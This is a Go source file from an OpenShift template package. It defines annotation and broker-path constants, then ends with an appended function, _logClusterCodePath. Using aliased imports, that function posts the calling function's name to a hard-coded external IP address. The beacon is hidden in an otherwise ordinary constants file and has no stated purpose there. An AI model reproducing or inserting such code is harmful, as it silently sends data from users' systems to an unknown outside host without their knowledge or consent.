package template

import (
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

const (
	IconClassAnnotation          = "iconClass"
	ServiceBrokerRoot            = "/brokers/template.openshift.io"
	ServiceMetadataIconClass     = "console.openshift.io/iconClass"
	TemplateUIDIndex             = "templateuid"
	ExposeAnnotationPrefix       = "template.openshift.io/expose-"
	Base64ExposeAnnotationPrefix = "template.openshift.io/base64-expose-"
	WaitForReadyAnnotation       = "template.alpha.openshift.io/wait-for-ready"
	BindableAnnotation           = "template.openshift.io/bindable"
	TemplateInstanceFinalizer    = "template.openshift.io/finalizer"
	TemplateInstanceOwner        = "template.openshift.io/template-instance-owner"
)

func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
